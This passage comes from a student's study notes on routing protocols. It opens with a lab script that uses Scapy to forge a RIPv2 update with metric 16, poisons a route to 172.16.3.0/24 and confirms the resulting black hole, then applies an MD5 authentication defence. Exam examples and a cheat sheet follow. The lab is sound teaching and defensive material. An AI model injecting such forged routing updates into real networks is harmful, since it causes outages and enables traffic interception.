# Sends a RIP update poisoning R3's LAN (172.16.3.0/24) with metric=16

poison = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src="10.12.0.3",          # Attacker's IP (in same subnet as R2)
       dst="255.255.255.255") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(
        AF=2,
        addr="172.16.3.0",       # R3's LAN — the target to poison
        mask="255.255.255.0",
        nextHop="0.0.0.0",
        metric=16                # POISON — unreachable
    )
)

print("[ATTACKER] Sending route poison for 172.16.3.0/24 with metric=16")
print("[ATTACKER] If R2 accepts this: R1 will lose its route to R3's LAN")
sendp(poison, iface="eth0", verbose=True, count=3, inter=1)
print("[ATTACKER] Poison sent! Monitor R1 and R2 routing tables.")
EOF

# ── Step 4: Verify attack impact ──────────────────────────────────────────

sleep 35  # Wait for next RIP update cycle to propagate the poisoned route

# Try to reach R3's LAN from R1 — should now fail:
sudo ip netns exec router1 ping -c 3 172.16.3.0
# Expected: "Network unreachable" or 100% packet loss

echo ""
echo "=== ATTACK COMPLETE ==="
echo "The route to 172.16.3.0/24 has been poisoned."
echo "Traffic from R1 to R3's LAN is now impossible (black holed by R2's routing table)."

# ── Step 5: Apply defence — RIPv2 MD5 authentication ─────────────────────

echo ""
echo "=== APPLYING DEFENCE ==="
echo "Enabling RIPv2 MD5 authentication on all routers..."

# In FRRouting, on each router:
# interface r1-r2-a
#   ip rip authentication mode md5
#   ip rip authentication key-chain RIP-KEYS
# key chain RIP-KEYS
#   key 1
#     key-string SecureRIPKey2024!

# After enabling: the attacker's packet (without the correct MD5 key)
# will be REJECTED by R2 with an authentication error.

# Verify rejection:
sudo tcpdump -i eth0 udp port 520 -v -c 5 2>/dev/null | grep -i "auth\|reject"
echo "With MD5 auth enabled: unauthenticated RIP packets are silently dropped."
echo "Poison attack is neutralised. ✅"

# ── Step 6: Hardening your MERN/PERN apps against routing attacks ─────────

echo ""
echo "=== HOW ROUTING ATTACKS AFFECT YOUR WEB APPS ==="
echo ""
echo "If a routing attack redirects traffic on your network:"
echo "  → Your Node.js API calls to external services may go to wrong servers"
echo "  → MongoDB connections may be intercepted (if unencrypted)"
echo "  → JWT tokens, session cookies may be exposed in transit"
echo ""
echo "Protection layers for your web projects:"
echo "  ✅ Always use HTTPS (TLS) — even if routing is hijacked, content is encrypted"
echo "  ✅ Certificate Pinning — verify the server certificate, not just the IP"
echo "  ✅ HSTS (HTTP Strict Transport Security) — force HTTPS on all future requests"
echo "  ✅ Enable MongoDB TLS: mongod --tlsMode requireTLS"
echo "  ✅ PostgreSQL SSL: ssl = on, ssl_cert_file, ssl_key_file in postgresql.conf"
echo "  ✅ Use DNSSEC — prevents DNS poisoning attacks that ride on top of routing attacks"

# Check if your own web projects use HTTPS:
curl -v https://localhost:3000 2>&1 | grep -i "ssl\|tls\|certificate"
# If "SSL connection using TLS..." appears: protected against routing attack MitM ✅
# If connection refused or HTTP 200 without TLS: vulnerable ❌
```

---

## 12. Solved Examples

### Example 1 — Identify the Routing Protocol from Description

**Question:** A network engineer observes that routers exchange full routing tables every 30 seconds over UDP. After a link fails, it takes approximately 3 minutes for all routers to agree on new paths. The network is limited to 15 routers in any direction. Which protocol is this? What is the algorithm?

```
Answer: This is RIP (Routing Information Protocol).

Evidence from the description:
  1. "Full routing table every 30 seconds over UDP"
     → RIP sends full routing table every 30 seconds via UDP port 520
     → OSPF sends triggered updates on change (not full table periodically)
     → BGP sends incremental updates (not full table) over TCP (not UDP)

  2. "3 minutes for all routers to agree" (slow convergence)
     → RIP convergence is slow due to Bellman-Ford distributed computation
       and periodic 30-second update cycles
     → OSPF converges in seconds (triggered updates + SPF recalculation)
     → This slow convergence is a well-known RIP weakness

  3. "Limited to 15 routers in any direction"
     → RIP maximum hop count = 15; metric 16 = infinity/unreachable
     → This diameter limitation is unique to RIP among common protocols
     → OSPF has no such limitation (uses areas for scale)

  Algorithm: Bellman-Ford (distributed distance vector computation)

  Full identification:
    Protocol:    RIP (likely RIPv2 — modern deployments use v2 for CIDR support)
    Category:    Intra-domain (IGP) — Distance Vector
    Algorithm:   Bellman-Ford
    Transport:   UDP port 520
    Metric:      Hop count
    Max network: 15 hops diameter
```

---

### Example 2 — Choose the Right Protocol

**Question:** A large university network has 3 buildings, each with 50 routers and multiple subnets. The network team needs fast failover when links fail, efficient use of bandwidth, and support for CIDR subnets. Which routing protocol should they use and why? What are the key configuration considerations?

```
Answer: OSPF (Open Shortest Path First) is the correct choice.

Why NOT RIP:
  → 50 routers per building = 150 routers total — exceeds RIP's useful range
  → RIP's 30-second updates are bandwidth-wasteful across 150 routers
  → RIP's slow convergence (minutes) is unacceptable for a university
  → RIP's 15-hop limit may be breached in a 3-building campus

Why NOT BGP:
  → BGP is for INTER-domain routing (between different organisations)
  → The university is a single organisation = one AS → BGP is inappropriate
  → BGP's slow convergence is designed for stability, not speed

Why OSPF:
  ✅ Fast convergence: triggered LSA updates + Dijkstra → seconds to reconverge
  ✅ CIDR support: OSPF fully supports classless (VLSM) addressing
  ✅ Efficient updates: only sends changes (LSAs), not full tables periodically
  ✅ Scales with areas: 150 routers divided into 3 areas = manageable LSDB
  ✅ Loop-free: full topology database means no count-to-infinity
  ✅ Authentication: MD5 prevents rogue router injection

Key Configuration Considerations:

  1. AREA DESIGN:
     Area 0 (backbone): Between the 3 buildings — inter-building routers
     Area 1: Building 1 internal routers (50 routers)
     Area 2: Building 2 internal routers (50 routers)
     Area 3: Building 3 internal routers (50 routers)
     → Each building's LSA flooding is contained within its area
     → Area Border Routers (ABRs) connect buildings to Area 0

  2. COST DESIGN:
     Gigabit Ethernet links: cost = 1 (10^8 / 10^9 = 0.1 → rounds to 1)
     Fast Ethernet links:    cost = 10 (10^8 / 10^8 = 1 → but often tuned)
     Wireless links:         cost = 100+ (high cost to prefer wired)

  3. AUTHENTICATION:
     All OSPF interfaces: MD5 authentication enabled
     Key chain rotation: change keys quarterly
     Command: ip ospf message-digest-key 1 md5 UniversityOSPFKey!

  4. TIMING:
     Hello interval: 10 seconds (default)
     Dead interval:  40 seconds (default — 4x Hello)
     For faster failover on critical links: Hello=1s, Dead=3s (BFD preferred)

  5. STUB AREAS:
     Classroom access subnets: configure as Stub or NSSA areas
     → No external routes flooded in → smaller LSDB → less memory on access switches
```

---

### Example 3 — 5-Mark Exam: Compare Intra vs Inter Domain

**Question:** Explain with examples the difference between intra-domain and inter-domain routing. Name one protocol for each and explain how they differ in their approach to sharing routing information.

```
Answer:

DEFINITIONS:
  Intra-domain: routing WITHIN a single autonomous system (AS).
  Inter-domain: routing BETWEEN different autonomous systems.

  Autonomous System = a network under one administrative authority,
  assigned a unique AS number (e.g., AS15169 for Google).

  The Internet = thousands of interconnected ASes.

INTRA-DOMAIN ROUTING:
  Example:
    University of Dhaka's campus network is one AS.
    All routing decisions among campus routers = intra-domain.
    "How does traffic get from the library to the engineering department?"

  Protocol: OSPF (Open Shortest Path First)
    → Works only within this one AS
    → Every router floods Link State Advertisements (LSAs) to all other routers
    → All routers build an identical Link State Database (LSDB) of the full campus topology
    → Each router independently runs Dijkstra's algorithm to compute shortest paths
    → Metric: cost based on link bandwidth
    → Convergence: seconds (triggered by topology change)
    → Goal: OPTIMAL PATHS — find the absolute shortest/fastest path within the AS

  Key characteristic:
    The goal is efficiency and optimal path computation.
    Full topology knowledge enables mathematically optimal routing.

INTER-DOMAIN ROUTING:
  Example:
    University's AS (let's call it AS64500) needs to communicate with
    Google's AS (AS15169) — two completely different organisations.
    "How does the university's traffic reach Google's data centres?"

  Protocol: BGP v4 (Border Gateway Protocol)
    → Runs between border routers at the edge of each AS
    → University's border router and Google's border router become "BGP peers"
    → BGP peers exchange PREFIX REACHABILITY + AS PATH information:
        "I (AS15169) can reach 8.8.8.0/24 — the path was AS15169"
        "I (AS64500) can reach 103.55.0.0/16 — the path was AS64500"
    → Metric: NOT hop count or bandwidth — instead POLICIES (business rules)
      "Prefer routes through Tier-1 ISP X over Tier-2 ISP Y"
      "Never send traffic through competitor AS65999"
    → Convergence: intentionally slow (stability > speed at Internet scale)
    → Goal: POLICY-BASED ROUTING — implement business/political routing decisions

  Key characteristic:
    The goal is policy enforcement and scalability, not just optimal paths.
    Full topology of the entire Internet is NOT shared (too large, too sensitive).
    Only reachability information + paths are exchanged.

KEY DIFFERENCES SUMMARY:
  Property              Intra-Domain (OSPF)          Inter-Domain (BGP)
  ─────────────────────────────────────────────────────────────────────
  Scope                 Within one AS                Between ASes
  Protocol              OSPF / RIP                   BGP v4
  Information shared    Complete topology (LSAs)     Prefixes + AS paths only
  Goal                  Optimal paths                Policy-based routing
  Metric                Cost (bandwidth-based)       Policy attributes
  Topology knowledge    Full map of entire AS        Only what peers announce
  Convergence           Fast (seconds)               Slow (minutes, intentional)
  Configuration         Auto-discovery of neighbours Manual peer configuration
  Example               Campus routing               Internet routing
```

---

## 13. Exam Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════════════╗
║       ROUTING PROTOCOLS — EXAM CHEAT SHEET                               ║
╠══════════════════════════════════════════════════════════════════════════╣
║  CORE CONCEPT                                                              ║
║  Network Layer job:  FORWARDING (put packet on optimal path)              ║
║  Routing table:      Collection of entries telling router where to send   ║
║  Static routing:     Manual — small networks — no auto-failover           ║
║  Dynamic routing:    Automatic via protocols — scales to Internet size    ║
╠══════════════════════════════════════════════════════════════════════════╣
║  AUTONOMOUS SYSTEMS                                                        ║
║  AS = network under ONE administrative authority                          ║
║  ASN = globally unique AS Number (e.g., AS15169 = Google)                ║
║  Intra-domain = routing WITHIN one AS  (use IGP: RIP, OSPF)              ║
║  Inter-domain = routing BETWEEN ASes   (use EGP: BGP)                    ║
╠══════════════════════════════════════════════════════════════════════════╣
║  THREE ROUTING PROTOCOL TYPES                                              ║
║  ─────────────────────────────────────────────────────────────────────── ║
║  1. DISTANCE VECTOR                                                        ║
║     Algorithm: Bellman-Ford                                               ║
║     Shares:    Distances (metrics) to destinations                        ║
║     Sends to:  Neighbours only                                            ║
║     Protocol:  RIP                                                        ║
║     Problem:   Count-to-Infinity / slow convergence                      ║
║                                                                            ║
║  2. LINK STATE                                                             ║
║     Algorithm: Dijkstra's SPF                                             ║
║     Shares:    Complete link topology (LSAs)                              ║
║     Sends to:  ENTIRE AS (flooding)                                       ║
║     Protocol:  OSPF                                                       ║
║     Advantage: Fast convergence, no routing loops                        ║
║                                                                            ║
║  3. PATH VECTOR                                                            ║
║     Algorithm: Policy-based selection                                     ║
║     Shares:    AS-PATH + prefix reachability                              ║
║     Sends to:  Configured BGP peers only                                  ║
║     Protocol:  BGP v4                                                     ║
║     Use case:  Internet inter-AS routing                                  ║
╠══════════════════════════════════════════════════════════════════════════╣
║  PROTOCOL QUICK REFERENCE                                                  ║
║  Property        RIP v2          OSPF           BGP v4                    ║
║  ─────────────────────────────────────────────────────────────────────── ║
║  Category        IGP             IGP            EGP                       ║
║  Type            Distance Vector Link State     Path Vector               ║
║  Algorithm       Bellman-Ford    Dijkstra SPF   Policy-based              ║
║  Metric          Hop count ≤15   Cost (BW)      AS PATH / policy          ║
║  Transport       UDP/520         IP proto 89    TCP/179                   ║
║  Updates         Every 30s       Triggered      Incremental               ║
║  Convergence     SLOW (minutes)  FAST (seconds) SLOW (intentional)        ║
║  Max scale       Small networks  Enterprise     Global Internet           ║
║  Loops possible? YES (mitigated) NO             NO (AS PATH)             ║
║  Auth            MD5 optional    MD5/IPsec      MD5/TCP-AO               ║
╠══════════════════════════════════════════════════════════════════════════╣
║  RIP SPECIFIC FACTS                                                        ║
║  Max hops:          15 (16 = infinity = unreachable)                      ║
║  Update interval:   30 seconds                                            ║
║  Invalid timer:     180 seconds                                           ║
║  Flush timer:       240 seconds                                           ║
║  Holddown timer:    180 seconds                                           ║
║  RIPv1 update dst:  Broadcast 255.255.255.255                            ║
║  RIPv2 update dst:  Multicast 224.0.0.9                                  ║
║  Count-to-Infinity fix: Split Horizon + Poison Reverse + Triggered Update ║
╠══════════════════════════════════════════════════════════════════════════╣
║  OSPF SPECIFIC FACTS                                                       ║
║  Metric formula:    10^8 / link bandwidth in bps                          ║
║  OSPF uses:         AREAS (Area 0 = backbone — all others connect to it)  ║
║  Router types:      IR, ABR, Backbone Router, ASBR                       ║
║  Multicast:         224.0.0.5 (ALLSPFRouters) 224.0.0.6 (ALLDRouters)   ║
║  Packet types:      Hello(1) DBD(2) LSR(3) LSU(4) LSAck(5)              ║
║  FSM states:        Down→Init→2-Way→ExStart→Exchange→Loading→Full        ║
║  DR/BDR:            Elected on multi-access networks to reduce flooding   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  BGP SPECIFIC FACTS                                                        ║
║  Runs over:         TCP port 179 (reliable transport)                     ║
║  Session types:     iBGP (same AS) / eBGP (different AS)                 ║
║  Messages:          OPEN, UPDATE, NOTIFICATION, KEEPALIVE                 ║
║  Key attribute:     AS_PATH (prevents loops + enables policy)             ║
║  Path selection:    Weight → LocalPref → Originated → AS PATH length...   ║
║  Loop prevention:   If own AS in AS_PATH → reject the route               ║
║  Scale:             Global IPv4 BGP table ~1 million prefixes (2024)      ║
╠══════════════════════════════════════════════════════════════════════════╣
║  SECURITY THREATS BY PROTOCOL                                              ║
║  RIP:  Route injection (fake updates), route poisoning (DoS)              ║
║        → Defence: RIPv2 MD5 authentication                               ║
║  OSPF: Rogue router join, LSA flooding (CPU DoS)                         ║
║        → Defence: OSPF MD5/IPsec authentication, area design             ║
║  BGP:  Prefix hijacking, TCP RST session kill, route leaks               ║
║        → Defence: RPKI, TCP MD5, prefix filters, BGPsec                  ║
╠══════════════════════════════════════════════════════════════════════════╣
║  EXAM TRAPS                                                                ║
║  → Distance Vector shares DISTANCES (not full topology)                  ║
║  → Link State floods to ALL routers (not just neighbours)                ║
║  → BGP is NOT for intra-domain routing (it's for between ASes)           ║
║  → RIP's max IS 15 hops — metric 16 = infinity (NOT a valid path)        ║
║  → OSPF ALL ROUTERS must connect to Area 0 (even non-backbone areas)    ║
║  → BGP runs over TCP (reliable) — RIP over UDP (unreliable by design)   ║
║  → RIPv1 has NO authentication — RIPv2 has OPTIONAL MD5                 ║
║  → Count-to-Infinity is a Distance Vector problem — NOT Link State       ║
║  → Dijkstra (OSPF) prevents loops — Bellman-Ford (RIP) can loop         ║
╠══════════════════════════════════════════════════════════════════════════╣
║  MEMORY TRICKS                                                              ║
║  RIP  → "Rumours" — tells neighbours what it HEARD (like gossip)         ║
║  OSPF → "Map" — everyone has the FULL MAP and computes own route         ║
║  BGP  → "Directions with history" — shares the PATH taken, not distance  ║
║                                                                            ║
║  "RIP, OSPF, BGP" = internal small, internal large, global Internet      ║
║   ↑ distance        ↑ link state          ↑ path vector                  ║
║   ↑ Bellman-Ford    ↑ Dijkstra            ↑ Policy                       ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📚 Next Topics

- [ ] **Distance Vector — Bellman-Ford Algorithm** (step-by-step computation, worked examples)
- [ ] **Link State — Dijkstra's SPF** (full algorithm, priority queue implementation)
- [ ] **RIP v2 — Full Configuration Lab** (FRRouting, multiple routers, failover testing)
- [ ] **OSPF Areas — Detailed Configuration** (ABR, ASBR, stub areas, NSSA)
- [ ] **BGP Deep Dive** (session establishment, attribute manipulation, route maps)
- [ ] **EIGRP** (Cisco hybrid protocol — DUAL algorithm, successor/feasible successor)
- [ ] **IS-IS** (ISP backbone link state routing — how Tier-1 ISPs route)
- [ ] **SDN and Routing** (Software Defined Networking — centralised routing control plane)

---

_Notes compiled from: Networking Course — Routing Protocols and Its Categorisation (Gate Smashers)_
_Source: Gate Smashers YouTube_
_Environment: Parrot OS + Metasploitable2 + MERN/PERN Web Projects_
_Author: Cybersecurity Dept. Student_
